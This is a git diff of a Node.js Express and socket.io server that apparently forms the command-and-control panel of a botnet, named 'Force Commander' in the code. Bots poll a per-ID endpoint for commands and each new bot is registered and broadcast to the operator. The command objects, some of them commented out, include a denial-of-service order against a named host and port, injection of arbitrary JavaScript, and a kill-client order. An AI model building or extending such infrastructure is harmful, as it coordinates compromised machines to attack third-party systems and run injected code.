@@ -3,26 +3,33 @@ var app = require('express')(),
     io = require('socket.io')(http),
     config = require('./config.json'),
     exphbs  = require('express-handlebars'),
-    liveCommands = {};
+    bots = {},
+    //    currCommand = {};
+    //     currCommand = {DOS: {prot:'http', host: "ftp.ladder.com", port: "21" } };
+    //     currCommand = {injectJs: "console.log('you got hacked')" };
+    currCommand = {killClient: true };
+
 app.engine('handlebars', exphbs({defaultLayout: 'main'}));
 app.set('view engine', 'handlebars');
 
 // express loads the homepage
 app.get('/', function (req, res) {
-    res.render('index', { name: 'Tobi',layout: false });
+    console.log('Requesed Force Commander')
+    res.render('index', { name: 'Tobi',bots:bots,layout: false });
 });
-
-app.get('/commands/get', function (req, res) {
-    res.json(liveCommands);
+// bot get command
+app.get('/commands/get/:id', function (req, res) {
+    var id = req.params.id;
+    res.json(currCommand);
+    console.log('Bot : ',id, ' Request Commands: ', currCommand)
+    if(!bots[id]){
+        io.sockets.emit('bot-join', { id: id });
+        bots[id] = true;
+        console.log('New Bot: ',  id);
+    }
+    currCommand = {};
 });
-// app route
-app.route('/bot/:id')
-    .get(function(req, res, next) {
-    //  res.json(...);
-}).post(function(req, res, next) {
-    // maybe add a new event...
-});
-
+// from force command
 app.route('/command/send')
     .get(function(req, res, next) {
     //  res.json(...);
@@ -31,8 +38,9 @@ app.route('/command/send')
 });
 io.on('connection', function(socket){
     console.log('Force commander connected');
-    socket.on('chat message', function(msg){
-        console.log('message: ' + msg);
+    socket.on('cmd', function(cmd){
+        // when the force commander sends a command
+        console.log('message: ' + cmd);
     });
 });
 
